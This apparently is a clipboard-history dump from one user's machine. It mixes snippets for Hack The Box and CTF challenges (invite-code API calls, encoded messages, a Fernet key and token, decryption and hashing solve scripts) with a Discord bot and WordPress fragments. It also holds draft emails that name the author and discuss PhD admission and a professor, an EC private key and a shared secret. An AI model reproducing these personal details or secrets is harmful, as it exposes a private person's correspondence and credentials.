	'1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',
4a1fd1f410f3929e2f884522e899f54d|untitled:1|27|3|^v|javascript
	'1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, {})
abac8287994fdd90eefd283f46664e2c|untitled:1|27|3|^v|javascript
	'1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, {}
fb38f81b8c8ad8f895969dba87bcffc0|untitled:1|1|1|V|
	d = {}
	e = 0
	k = 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|')
	c = 24dd
	a = 24
	'1 i(4){
	        h 
	        8={"4":4};
	        $.9({
	            a:"7",
	            5:"6",
	            g:8,
	            b:\'/d/e/n\',
	            c:1(0){3.2(0)},
	            f:1(0){3.2(0)}
	            })
	    }
	    1 j(){
	        $.9({
	            a:"7",
	            5:"6",
	            b:\'/d/e/k/l/m\',
	            c:1(0){3.2(0)},
	            f:1(0){3.2(0)}
	            })
	        }'
37f2b7e469511947d578afb467a21db3|untitled:1|15|14|v|javascript
	/api/invite/how/to/generate
53373b84f9cc4135d2dcd032a80c19b0|untitled:1|17|1|V|javascript
	        error:function(response){console.log(response)}})
	}
6d24b43719a36a0b84ff703cd2f8badb|untitled:1|15|25|v|javascript
	/how
e510a7727737f8f6742c6ec1173ceb76|untitled:1|11|1|V|javascript
	function makeInviteCod(){
	    $.ajax({
	        type:\"POST\",
	        dataType:\"json\",
	        url:'/api/invite/generate',
	        success:function(response){console.log(response)},
	        error:function(response){console.log(response)}})
	}
fc266f1388ab8a56df5418426c89609f|untitled:1|11|21|v|javascript
	od(){
8333a87a7c1338d2969c1b41676c12f7|untitled:1|11|1|V|javascript
	function makeInviteCod(){
	    $.ajax({
	        type:"POST",
	        dataType:"json",
	        url:'/api/invite/generate',
	        success:function(response){console.log(response)},
	        error:function(response){console.log(response)}})
	}
9091f2d8cb9f0fe1235cd9c4a11c74fc|file:///home/neo/hackthebox/keys.txt|1|1|V|text
	hBU9lesroX_veFoHz-xUcaz4_ymH-D8p28IP_4rtjq0=
f1c8530424ae58004a45df3a1aba0b91|file:///home/neo/hackthebox/keys.txt|2|1|V|text
	gAAAAABaDDCRPXCPdGDcBKFqEFz9zvnaiLUbWHqxXqScTTYWfZJcz-WhH7rf_fYHo67zGzJAdkrwATuMptY-nJmU-eYG3HKLO9WDLmO27sex1-R85CZEFCU=
44cb4bcd99f9f182c219e1de6e6d0767|file:///home/neo/hackthebox/bank_heist_message.txt|1|1|V|text
	444333 99966688 277733 7773323444664 84433 22244474433777, 99966688 277733 666552999. 99966688777 777744277733 666333 84433 443344477778 4447777 44466 99966688777 4466688777733. 84433 5533999 8666 84433 55566622255 4447777 22335556669. 4666 8666 727774447777.
3280aac6da5653c4815c66fe6e2825ce|file:///home/neo/hackthebox/bank_heist_message.txt|1|1|V|text
	444333 99966688 277733 7773323444664 84433 22244474433777, 99966688 277733 666552999. 99966688777 777744277733 666333 84433 443344477778 4447777 44466 99966688777 4466688777733. 84433 5533999 8666 84433 55566622255 4447777 22335556669. 4666 8666 727774447777.
	
	47777888 995559888 4555 47777888 44999988 666555997 : 8555444888477744488866888648833369!!
cac8ac24f2ad59a44c261755471e6f1f|file:///tmp/neomutt-neo-1000-2445-8368220280035271234|177|1|V|mail
	Again, I'm very excited with the prospective of you joining Brown and 
	working together, and I look forward to meeting you! If, in the 
	meantime, you'd like to chat about research, the CS dept., Brown, 
	Providence, or whatever else may concern you, do not hesitate to contact 
	me. Congratulations, and I hope you'll decide to join us next fall :).
88a152a5dd07783d37bc7fe0e98b056a|file:///tmp/neomutt-neo-1000-2445-8368220280035271234|177|1|V|mail
	Again, I'm very excited with the prospective of you joining Brown and 
d4f445fb9f792960574b2ed33ac98ce5|untitled:1|1|1|V|
	dalkfjadskjflk;dsjf;lak
ab1bb4f929060502126811a6e7145398|untitled:1|7|30|v|
	I am not sure whether I will be able to make it. I still need to look into it to see if I could get a visa approved in time and if I can find plane tickets, but I think it would be a bit difficult to travel from Cyprus to Province for a weekend.
1a7d241cf6264543d9b406adf3bef54a|untitled:1|5|1|V|
	I have already taken a look at your and your colleagues' work and I am particularly interested in your work and the work of the CAPS group. 
e06184ac57ad9b4fba932c39bed765e5|untitled:1|5|113|v|
	work 
d8f41d14eaed7c31784dc879dd836712|untitled:1|3|28|v|
	accepted at
a6a025e09259d00083dfcb811f94bdda|untitled:1|5|8|v|
	already 
1528fcde476f7ab45ab46128df98834d|untitled:1|1|1|V|
	Dear professor Kemerli,
	
	I am really excited to get admitted to Brown University, thank you very much for accepting my application!
	
	I have taken a look at your and your colleagues' work and I am particularly interested in your work and the CAPS group. 
	
	As for the visiting weekend, I need to look into it and see if I would be able to get a visa approved in time. I will let you know if I will be able to make it.
	
	I would love to learn more details about what you are currently working on. One of your current students has also contacted me so I will get in contact with him to learn more details about the CS department and the university in general!
	
	Thank you,
	Neophytos Christou
	
63ccd394e64ffdc2b7aa44698b34a24a|untitled:1|5|1|V|
	I have taken a look at your and your colleagues' work and 
0e0d7385b85f027fb927b353b6c94184|untitled:1|9|1|V|
	I would love to learn more details about what you are currently working on. One of your current students has also contacted me so I will get in contact with him to learn more details about the CS department and the university in general!
f9048bea6eed9ca719cc14ab7517119d|untitled:1|5|1|V|text
	I have taken a look at the projects and the research being conducted at Brown. I am particularly interested in your work and the CAPS group. I would love to learn more details about what you are currently working on. One of your current students has also contacted me so I will get in contact with him to learn more details about the CS department and the university in general!
3eb51e8df6a338cc1730f1249e260420|untitled:1|7|29|v|text
	 I need to look into it and see if I would be able to get a visa approved in time. I will let you know if I will be able to make it.
1197d6c00adb4b49ad3a5aaec751efe0|untitled:1|7|130|v|text
	it would not be too easy for me to make it
a6efcf8845c524dfd6cfe03e252f2b59|untitled:1|1|1|V|text
	Dear professor Kemerli,
	
	I am really excited to get admitted to Brown University, thank you very much for accepting my application!
	
	I have taken a look at the projects and the research being conducted at Brown. I am particularly interested in your work and the CAPS group. I would love to learn more details about what you are currently working on. One of your current students, Kent, has also contacted me so I will get in contact with him to learn more details about the CS department and the university in general!
	
	As for the visiting weekend, as you understand, I would need to travel for more than 25 hours to come to Providence from Cyprus, so it would be a bit of a hustle for me to visit for just a weekend. Would it be okay to arrange a video call and talk about some of the details I would miss in case I cannot make it?
	
	Thank you,
	Neophytos Christou
	
021078df4dbdde71b63e5a945a387354|untitled:1|1|1|V|text
	Dear professor Kemerli,
217fad45cd4b034dc40ceaf4f286d0d9|untitled:1|1|1|V|text
	Hello Kent, 
	
	Thank you for getting in touch with me. There are a couple of things I would like to ask you. 
	
	First of all, do you believe it is very important for me to visit during the visiting days? I would love to come to Providence to see the university environment, but a trip from Cyprus to Providence is around 25-30 hours and I would need at least an extra $500 to travel apart from the expenses covered by the university, so I am not sure if it is worth the hustle for me to visit for just a weekend.
	
	Also, regarding the stipend PhD students receive from the university, is it enough to cover the living expenses at Rhode Island? As far as I know the cost of living there is a bit high and I am not sure exactly how high the salary of the PhD students is.
	
	And finally, what is it like working with professor Kemerlis and what is your research topic? I have taken a look at some of the work he does and I found it really interesting and it would be a pleasure for me to work with him.
	
	Thank you,
	Neophytos Christou
505a7cad57ed342b6b14381525fd8975|file:///home/neo/email.txt|1|1|V|text
	Hello Kent, 
df24536737923bc65a2a2fd984bdefdb|file:///home/neo/hackthebox/walzer.txt|1|1|V|text
	mvj03Z/F98Sf25nLw8L/5t3MyNvaxMn72prZ6N7YnMKezPz33tTByd3Uyejd1PzLns/B+9qa4MvDwv/72uvjycOb3cme2P/ow+GZ9A==
a9606f69c89b3571b6062dca1c14ce0a|file:///home/neo/hackthebox/Illumination.JS/bot.js|1|1|V|javascript
	//Discord.JS
	const Discord = require("discord.js");
	const client = new Discord.Client();
	const fs = require("fs");
	var config = JSON.parse(fs.readFileSync("./config.json"));
	
	
	//Node-Hue-API
	var hue = require("node-hue-api"),
		HueApi = hue.HueApi,
		lightState = hue.lightState;
	
	//Display command results in console
	var displayResult = function(result) {
	
		console.log(JSON.stringify(result, null, 2));
		
	};
	
	//Function taken from campushippo.com
	var rgbToHex = function (rgb) { 
	
	  var hex = Number(rgb).toString(16);
	  if (hex.length < 2) {
	
	       hex = "0" + hex;
	  }
	
	  return hex;
	};
	
	//Function taken from campushippo.com
	var fullColorHex = function(r,g,b) {   
	  var header = "0x"
	  var red = rgbToHex(r);
	  var green = rgbToHex(g);
	  var blue = rgbToHex(b);
	  return header+red+green+blue;
	};
	
	//Declarations
	var host = config.host,
		username = config.username,
		api = new HueApi(host, username),
		state = lightState.create(),
		prefix = config.prefix,
		lightNum = config.lightNum;
	
	//Bot code
	client.on("ready", () => {
		console.log(`Logged in as ${client.user.tag}!`);
	});
	
	client.on("message", message => {
		if (message.author.bot) return; //Ignore bot messages
		if (message.content.indexOf(prefix) !== 0) return; //Ensure prefix is at the beginning
	
		const args = message.content.slice(prefix.length).trim().split(/ +/g); //Split command into arguments
		const command = args.shift().toLowerCase(); 
	
		switch (command) {
	
			case "light.off" : //Turn light off
				api.setLightState(lightNum, state.off())
			       .then(displayResult)
			       .done();
				message.channel.send("Light Off!");
				break;
	
			case "light.on" : //Turn light on
				api.setLightState(lightNum, state.on())
				   .then(displayResult)
				   .done();
				message.channel.send("Light On!");
				break;
	
			case "light.rgb" : //Change light colour
				let r = args[0];
				let g = args[1];
				let b = args[2];
				api.setLightState(lightNum, state.on().rgb(r, g, b))
				   .then(displayResult)
				   .done();
				const embed = new Discord.RichEmbed()
					.setTitle('Light Colour Change')
					.setColor(fullColorHex(r, g, b))
					.setDescription(`Red Value: ${r}. Green Value: ${g}. Blue Value: ${b}`);
				message.channel.send(embed);
				break;
	
			case "light.switch" : //Switch to different light
				let num = args[0];
				lightNum = num;
				//fs.writeFile("./config.json", JSON.stringify(config))
				message.channel.send(`Light Number switched to ${lightNum}`);
		}
	});
	
	client.login(Buffer.from(config.token, 'base64').toString('ascii')) //Login with secret token
3d10d1747aab7f8ffb7b423e2611a706|file:///tmp/neomutt-neo-1000-2997-4238294786277085884|6|1|V|mail
	I'll definitely more into the housing prices.
c0e4c2a5f4a439272adf357a07f54f06|file:///tmp/neomutt-neo-1000-2997-1254248196962542866|56|1|V|mail
	> (One thing to keep in mind with all supervisors is the inherent power
	> imbalance. vpk's pretty good about managing it, but it does crop up every
	> now and then in his blind spot. IME, mostly in the form of criticism coming
	> across much more harshly than it was intended to. He hasn't been a prof for
	> all that long --- going on five years now? --- so he's still growing into
	> some aspects of it.)
708db2d66cdb872f4989de32adab2700|file:///tmp/neomutt-neo-1000-2997-1254248196962542866|12|35|v|mail
	for the next years 
57a6c6dd30ff21524590317f6a1c86c8|file:///tmp/neomutt-neo-1000-2997-1254248196962542866|11|36|v|mail
	, but hopefully I will have more than
7c58ea1d065ddf78c07e1e8c8ef72045|file:///tmp/neomutt-neo-1000-2997-1254248196962542866|12|1|V|mail
	enough time to explore Providence :).
ffc6b6869b2a369a48a48a3d31de5862|file:///tmp/neomutt-neo-1000-2997-1254248196962542866|7|1|V|mail
	after talking with another student who also told me that it is not
0eb1f4f3c406f8924ace137f0f9ed58b|file:///tmp/neomutt-neo-1000-2997-1254248196962542866|7|1|v|mail
	absolutely necessary for me to come
e5ab367ee37d053ae4d1c9aca4f5d009|file:///tmp/neomutt-neo-1000-2997-1254248196962542866|9|32|v|mail
	I would definitely love to come and I know it would be a great experience.
82a2aac38b288d1a5615d1c575dbed64|file:///tmp/neomutt-neo-1000-2997-1254248196962542866|7|10|v|mail
	the plane tickets only got more expensive and I would also have to pay to get a visa approved. 
da453637de0033b28b706661a33e3ed0|file:///tmp/neomutt-neo-1000-2997-1254248196962542866|6|78|v|mail
	 I would 
c699465d42f240db3478fe98c6927528|file:///tmp/neomutt-neo-1000-2997-1254248196962542866|7|1|v|mail
	definitely love to come and 
dec1f493003963dfb3a5115ea7826cee|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/register.js|2|9|v|javascript
	.register
5f13d4520e46a905ba68271c01b3e376|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|116|1|V|php
			    wp_enqueue_script( 'form_submit', home_url() . '/wp-includes/js/form_submit.js', array('jquery'), null, true );
132c2705f0e121029711eb4a000d08c5|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|117|7|V|php
			    wp_enqueue_script( 'register', home_url() . '/wp-includes/js/register.js', array('jquery'), null, true );
6266b0fac605517df5d83a7e00fb5157|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/reset_pass.js|2|10|v|javascript
	registerform
186bca7826f8aeb9aa3eb12928329389|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/reset_pass.js|9|29|v|javascript
	user_pass
3b3fb1c472cde4bf823bda1f8e3d6042|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/reset_pass.js|13|1|V|javascript
	        jQuery("#pass1").val(pk);//change input
b0b9bdeda921668bf12c109fe52ba3a4|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/reset_pass.js|14|9|V|javascript
	        jQuery("#pass2").val(pk);//change input
56e8347531433a3883fd0aed69ef89f5|file:///home/neo/.zshrc|122|1|V|zsh
	setxkbmap -option caps:swapescape
	setxkbmap -option ctrl:ralt_rctrl
2c72ca1611467e689a7aaecb0be81270|file:///home/neo/.config/i3/config|1|1|V|conf
	# This file has been auto-generated by i3-config-wizard(1).
fd99cadea9d8ef6a1ffcc52a2e3e8017|file:///tmp/neomutt-neo-1000-2782-6102202924578617148|3|16|v|mail
	advice
c05bd5258a90b533f18fa301f42ae0a3|file:///home/neo/cscc/basilisk64.txt|1|1|V|text
	Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOWFJsbDNXa2M1VjFKc2JETlhhMUpUVmpGS2MySkVU
	bGhoTWsweFZqQmFZV015U2tWVQpiR2hvVFZWd1ZWWnFRbUZUTWxKSVZtdHNhUXBTYldodlZGWm9R
	MVZXWkZkYVJGSmFWakF4TkZkcmFFZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prVjJKVldsVlVW
	M040VGtaWmVVNVZaRmRWV0VKd1ZUQldTMWRXV25STlZGSnJDazFXV2xoV01qVlRZVEZLYzJOSVRs
	WmkKV0doNlZHdGFhMk50UmtkYVIyaFNWMFZLVlZkWGRHOVJNV1JYVjJ0a1ZtRXpVbkJEYXpGelYy
	eG9XR0V4Y0hKV01HUkxWMVpXYzFacwpWbGNLWWtaV05GWlVRbUZaVjFKR1RsWmFZVkpzY0doVVZF
	SkxaREZhV0UxVVVtdE5WMUpZVjJ0YWIyRXhTblJWYmtwRVlYcEdXRmt3CldtOVhSMFY0WTBoS1Yy
	RnJjRXhXYlhocll6RmFjd3BXYkdOTFZGUktiMVJXV25GUmJVWlhUV3hLU1ZadGRHdFpWa3B6WTBo
	S1ZWWkYKU2t4YVJFWmhWMFV4UlZKc1NrNVdNVXBaVmpKMGIxUXhiRmRUYTFwVVlrWmFSVmxzVmxw
	TmJGWjBDbVJIT1ZoU01GWTBXVEJvUzFZdwpNVWhWYTNoV1lXdHdVRlV4V2s5amQzQlhZa2RPVEZa
	R1VrdGlNVTVYVjJ0b2JGSXdXbGhaYkZwaFYxWmFXR1JIT1ZaU2JIQjZWakkxClMxWldXa1lLVTJ0
	NFYwMVdjR2hWYWtaaFpFWktkR1JGTlZkTlZYQmFWbXBLTUZsWFNYbFRhMlJVWW1zMWNWVXdWbmRT
	Vm14WlkwVmsKYkdKR2JEVkRiVkpJVDFaa1RsSkZXWGhXYkdNeFV6Rlpkd3BOVldoV1lUTm9WMVJW
	V25kWFJuQkhWMnQwYW1RelFsaFphMlJQVkVaawpXR1JIUmxkTlJGWklWako0VjFWdFNsWlhiVVpY
	WWxSR1ZGVnFSbE5qTVdSMFpFWmtWMDFJUWxwWFZsWnJDbUl4V2xkWGExbExWVEowCk5GWXlTa2Rq
	UjJoV1lXdGFXRmt5ZUZOak1WWnlUbFprYVZORlNrdFdiWEJMVFVac1dGSlliRk5oTWxKV1dWUkti
	MVl4YkhKYVJrNVQKVm0xNGVsWnROV3NLVjBaS2MySkVWa1JoZWxaYVYydGFhMVJzU2taWFdHaFhZ
	a2ROZUZWNlJtdFNkM0JZWW1zMWNWVnRkRXRXTVZKVwpWMjVrV0ZKdGR6SlZiVEZIWVcxUmVsRnVS
	bFpoYTI5M1ZrVmFZUXBYUlRGRlVteEtUbUV5ZHpCV01uUnZWREZrU0ZOc1dsaGlSMUpXClZtcE9U
	MDVHVW5KWGJIQnNWbFJXV0ZaSGVHRlZNa3BKVVZoa1YySkhVVEJEYlVWNFYxaGtUbFpYVGt4V2Fr
	b3dDazVHV1hkTlZtUnEKVWpKb1dGUlZaRk5YUmxaeFVtNWtWRkl4U2tkVWJHUnZWR3hrUmxOcmRG
	ZGlWRVl6VlRKemVGWXhXbGxpUms1WVVqSm9WbGRYTVhwTgpWMDVYVm01T1ZtSnJOVlFLVm0weE5H
	VldXWGxPVlRoTFZrZHplRmRIVmtsaVJWSnBVbXh3TmxaclpEUmhNVkp6VjI1U2EyVnJjRmxXCmJY
	aGhZVVpzY1ZKc2NHeFZXRUpVVmpCa05GWXhiRlZVYlRsWFRWWktWd3BXTWpWclYwWktkVkZyYUZk
	TmJsSnlXVmN4VW1Wc1JuUmgKUmxwb1lUSTVNMVpyVm1GWlVYQllVbFJHVmxWWE1UQlViRnBWVm14
	c1YyRnJhM2hXVkVaVFl6RmtjbHBHVW1sV1ZuQlpDbGRXWkRCUwpNRFZIVlc1T1dHSkhVbkpWYWta
	TFUxWlJlRnBIT1ZWaVJuQmFWVlpvYTFkR1duTlhia3BFWWxWc05GWXllR3RYUjBWNFlrVjRWMVpG
	CmIzZERhelZIWWtaa1ZGZElRbThLVlRCV2QxZEdVbFphUms1WFVteFdNMWRyV2s5V1JrbDRWMnRz
	V21FeGNISlpWVlY0VjBkU1JWUnMKWkdsV1JWbDZWbGh3UW1WR1NYaGFSbXhvVW0xU2NGbHJWbmRX
	YkdSWVpFZDBUd3BTYkd3MFdXdG9TMWxXU2tkVGJGRkxWbTB3ZUU1SApWbk5YYmxKc1UwZE9URlpy
	WTNoVE1VbDRXa2hHVW1FeFNtOWFWM2hoV1ZaWmVXUkhSbWxOYTFwWVZqSjRhMWRHV2taVGJHeFhD
	bUV4CldreFpWVnB6WTFaS2MyTkhlRlpYUlVwV1YxZDBhMDVIU1hoV2JrWlVZbFJzV0ZSV1pEUmxa
	M0JYVmpOU2NsWnRlRXRqTVZweFZHeG8KYUUxV2NIbFdiRkpMVlcxV2MxSnVUbWtLVW01Q2NGVnFS
	a3RsVmxweVZtMUdXbFZZUWxSVVZtUlRUVVpXZEUxVVFsVmlSWEJJVmpKNApjMVl3TVhWVmJscFhV
	a1ZhWVZwV1drOWpNV1J6WVVkc1UwMVZjRmhEYkZwMFkwVTVWUXBpVmxwSVdUQmFiMkpHVGtaalNF
	cFZWbXh3Ck0xUlZXbmRTYkdSMFpFWmFUbEpGV2tsWFZsSlBZekZaZVZOc1ZsSlhSMmhGV1d0VmVF
	NUdXWGxsUjNSWVVqQldORmxyVmpSV01WcEcKQ21JelpFUmhlbFpJVmpGb2IxZEhTbkpPV0VWTFZs
	UkNWMlF4WkVkVmJGcGhVbXMxV1ZWdGVHRmxSbFowVGxkMFYxSnJiRFJWTW5SegpWMnhhV0ZWVVFs
	cFdiSEJNV2taYVIyUkdTbk1LV2tkc1YxSldXWHBXTVZwVFVXc3hWMU5ZYkZSaE1sSm9WVzB4YjJO
	R1ZuRlRiVGxYClZteHdlRlZYTVRCaFVYQk9ZWHBXV1ZadE1ERlZNa1Y0Vkd0b1ZtSkdSa3hXYlRC
	M1pVVTFTQXBXYkdSWVYwZDRUMVpzWkU5VVJscHgKVVcxR1dsWXdNVFJWTWpWSFZsZEZlRk51UWxa
	aVdHZ3lXbFZhWVdOc2NFVlZiRlpPVm14Wk1WWlVTVEZUTVZWNFdrVm9iRkp0YUZkRApiVXBaQ21G
	SGFGZGhNWEI2VkcxNFMyTnRVa2RVYlhST1RVVndORlpzWkRCWlYxRjRWVmhvVjJKcmNHaFZhMXBM
	VmtaYWRFMVdUazVWCldFSmhXVmR6TVdOc1dsWlhiVVpYWVhwV1dsWnRlR0VLVlRKS1JsZFljRmRX
	UlRWeVdrZDRRMVZ0U2paTlJYTkxDZz09Cg==
fb51648bfc8cd31b9d6a346ad0c88853|file:///home/neo/cscc/basilisk64.txt|45|1|V|text
	UlRWeVdrZDRRMVZ0U2paTlJYTkxDZz09Cg==
b21e1561184849c1d7425bad313aa4bd|file:///home/neo/cscc/calanthe/ct.txt|1|1|V|text
	hmt1xfuru4kdpq0vcsyqytjltytay6uygcmqz0g6yszgijn3viysvvgcopz3g7x3yieiuyyay6u6gcovzwhutoziiqt8ycy5vvemmovrgyx3zgipt8yezvuxkqkn0vgtx0yjeit8xgursxkoorzwhutowgiut8xpyvo2ido1zvcsxpyqiuptxgzwvwlhppzwhvtozeijuwyeurvukhopz6hux2sohlu0xjztu4klo1zycsyrzeiqtyycywvvgco2zxcsx3ziiqtyycy5uxlfpqt1e7xuueiqt8yaywqskdo1zvcsxsytixt6tayxu7leozz6hux2sogqtyycurvskdprzzcsxrytjnt5xeuru4khoozvcsysyteit1xbzrvsklo1zwhvyrsogxuvtazvu0khknzwg6xsueixtztazvu1kpos0ucsxuytjkptxby3u4emmuzzg7yrzijlptxpyxqskips0vhxyqyjjlptxgysu4koowz5gzrywmijuzxfurvvkdorzvg4xtyieiuyyaurvwkrkn0tg1xsyjcsswxfywu3klo1zycsysyminptvmy0u7kqknxuhxxqueixtztawuu1kqpr0tgtrywqijuwyeuru4klptz0g6xvueixtztayzuxlekn0rhuxxyiinn3vby5uwgcos0xgxyqzneit1xby5uwgcpuz0g4x0uejktyxbyuu0gcotz6huryxiiqtytazru7ljos0tcsysymijuxtay3u1khpqvrhxx2ziixt5xes1twkkosvrhwxxyrinptxpyxqskdpvvrgtx2yieiuwyhy6vukgknz0hvtoysirt0xis1sukoo2z6gwt1zgintxtazuuxkhor0ucsx3ykeiu0xbztqskdppzwcsyrytjpt7rkxuu7gcpqzwgxxzuejrtytay5u7ljkn0vg0xtuehpt1xjzvuxgcnuz6g4xusogqty5c0rx1koozvrhvysyfjrptyeyzuxklppvrhzxxyhittyxeuru0kdo1zva2vpuejluxxfywu4gcooz5gwtozhirt5ygywvugcop0whux2yniwt0tayzuxkdpp0va2wsyteit0yfy0uwkhkn0vg0yqytjnt0xiuruwkdppz2gxx2yjimptxmysu6kgpqt1f1x3zjjkptxgzwvwlhppzwcsx0yninuwtazwu6lfpnz6g3xtyscsr2xourvwklo0zwg4xtzhjlptxfy4uxleooz3gwtoyjjrtyyds1stgcpuz6hux0yieit6xbz0qskeps0tg6toyfjlptyaysuzkhpqvrhwytzgiwn3vpztqskdkn0ugtyuynixuvtay4utllknzshuxxzhinpurkxvu0khknzxg4xpyleit2yduro2ifmqyuevyzysfiuxwpzursjrowz5gwuryhfjutxiywvuhgopz3gxw3viiwu2wpy4rslelqvscttpufjv
0d586cfeeb1fab65daff3270a319b1b1|file:///home/neo/Documents/diplomatiki/auth-webapp/scrypt.py|1|1|V|python
	#!usr/bin/env python
61f68029f0db9b03e239df379956cf7e|file:///home/neo/Documents/diplomatiki/auth-webapp/scrypt.py|1|1|V|python
	#!usr/bin/env python
	""" Create scrypt hash """
3acbe55d6185e1ba7017b54c9b841f19|file:///home/neo/cscc/djinn/dj.py|2|5|v|python
	Create scrypt hash 
694c90f9bd7dec8b6608808ea5fad0cf|file:///home/neo/cscc/djinn/dj.py|6|32|v|python
	0,16777215
d9892c17e28b437e78744f47e50db28c|file:///home/neo/cscc/djinn/dj.py|10|11|v|python
	number[2:]
b1bc248a7ff2b2e95569f56de68615df|file:///home/neo/cscc/djinn/dj.py|9|11|v|python
	number
fd9002c9241eb9f9fc04db416aee4f13|file:///home/neo/cscc/djinn/dj.py|11|7|v|python
	hex_str
7908bcf18aa9ce9d43c1e533d5825a8d|file:///home/neo/cscc/djinn/dj.py|6|1|V|python
	sha256sum = hashlib.sha256()
8938e190cd1be30d5ce063b514ba8cd6|file:///home/neo/cscc/djinn/dj.py|10|7|v|python
	sha256sum.
ede37eec7dd9be4d4e1405ca0d6c0936|file:///home/neo/cscc/djinn/dj.py|10|7|v|python
	hashlib.sha256(hex_str).hexdigest()
efca4967ca947b769ecdd8fbbe82339c|file:///home/neo/cscc/djinn/dj.py|14|11|v|python
	sha256sum[-6:]
88c0a3ea05b60980e3cc5180b2e0d451|file:///home/neo/cscc/djinn/dj.py|7|1|V|python
	uuid.uuid4().hex
d8314daa3dccb29b883a3a0b80f0e919|file:///home/neo/cscc/djinn/dj.py|13|1|V|python
	    print(hex_str)
0df738410893d6476b8f476e7a779407|file:///home/neo/cscc/eclectic/jwk-pem.js|7|1|V|javascript
	{"kty":"EC","crv":"P-256","x":"KQZtjneOpCzd5JMz-Gn6myc7_nkBetAxZaRWAzN80Lw","y":"Tif2i_qWXvg_BMBgI8RU4PRw2rsJFdrGa2jVoMj9Yv8","d":"lo5Dv8lL7wSVVILYAKjm2UE9UOwXk8auzqF0Neu2rFs"}
46976f4c73482e3dbfa761f723e5a2b8|file:///home/neo/cscc/eclectic/jwk-pem.js|4|11|v|javascript
	{ kty: 'EC', crv: 'P-256', x: '...', y: '...' },
664deabd31a78947f655b19a428616b0|file:///home/neo/cscc/eclectic/jwk-pem.js|8|22|v|javascript
	"hello: "
ee9d7e0a697372eb41f454b06d08ee79|file:///home/neo/cscc/eclectic/jwk-pem.js|4|187|v|javascript
	{"kty":"EC","crv":"P-256","x":"KQZtjneOpCzd5JMz-Gn6myc7_nkBetAxZaRWAzN80Lw","y":"Tif2i_qWXvg_BMBgI8RU4PRw2rsJFdrGa2jVoMj9Yv8","d":"lo5Dv8lL7wSVVILYAKjm2UE9UOwXk8auzqF0Neu2rFs"},
8a5ebaaf201c448241640d5bed782577|file:///home/neo/cscc/eclectic/jwk-pem.js|5|23|v|javascript
	, {private: true,}
3877e4b3da127e3bf2da6bdf6af2700a|file:///home/neo/cscc/eclectic/shared_key.txt|1|1|V|text
	5cb22981192bcf1a99cbdb27a031bfe385c960829d46edea519e964009d7fcb3
6f540c6e07a16a9ecd79f42019e9e578|file:///home/neo/Documents/diplomatiki/auth-webapp/scrypt.py|12|1|V|python
	PASSWORD = str(sys.argv[1])
319f4d26e3c536b5dd871bb2c52e3178|file:///home/neo/cscc/jaskier/solve.py|47|1|v|python
	PASSWORD
21ffce5b8a6cc8cc6a41448dd69623c9|file:///home/neo/cscc/jaskier/solve.py|52|32|v|python
	params
f6c8752edc4c44a63a74652d4b0c1ead|file:///home/neo/cscc/jaskier/solve.py|53|15|v|python
	base64.b64decode(input
6bff238a2bb81a0aacd344cddcc6c38b|file:///home/neo/cscc/jaskier/solve.py|55|1|V|python
	print(decrypt(b64dec).decode('utf-8'))
3656d33343576dc6d51cd700464276b1|file:///home/neo/cscc/jaskier/solve.py|55|22|v|python
	.decode('utf-8'
9fb16f52df1179bb4afb46d5b8e929a6|file:///home/neo/cscc/jaskier/solve.py|32|1|V|python
	def decrypt(ct):
	    """
	    Decrypt function
	    Global Vars:
	    ------------
	    BLOCK_SIZE = 2
	    TABLE_DIM = 4
	    """
	    dec = [] 
	    blocks = blockify(ct, BLOCK_SIZE, b'\x00') 
	    for blk in blocks:
	        blk_int = int.from_bytes(blk, byteorder='big')
	        for n in range(TABLE_DIM, -1, -1):
	            a,b = cnt(blk_int, TABLE_DIM, n)
	            blk_int = h_rotl(blk_int, a, TABLE_DIM, b)
	        dec.append(blk_int.to_bytes(BLOCK_SIZE, byteorder='big'))
	    return b''.join(dec).strip(b'\x00')
d60d71777e94bcc3ddfa643372ab60c7|file:///home/neo/cscc/jaskier/solve.py|32|1|V|python
	def decrypt(ct):
	    """
9a2d8ce3ffdcdf2123bddd94d79ef200|file:///home/neo/cscc/jaskier/solve.py|51|5|v|python
	decrypt
81f03aff7fff56066378f06f4b21dc0e|file:///home/neo/cscc/jaskier/solve.py|52|1|V|python
	    """
	    Decrypt function
	    Global Vars:
	    ------------
	    BLOCK_SIZE = 2
	    TABLE_DIM = 4
	    """
d26b2f3c74162edb74cd9581f11b2b92|file:///home/neo/cscc/jaskier/solve.py|67|1|V|python
	print(b64dec)
db03248ae6175d72d08da6773ae8cf25|file:///home/neo/cscc/jaskier/solve.py|68|1|V|python
	print(decrypt(b64dec))
a484f17a66f8900a249693be4f2e078b|file:///home/neo/cscc/jaskier/solve.py|32|1|V|python
	DEF DEcrypt(ct):
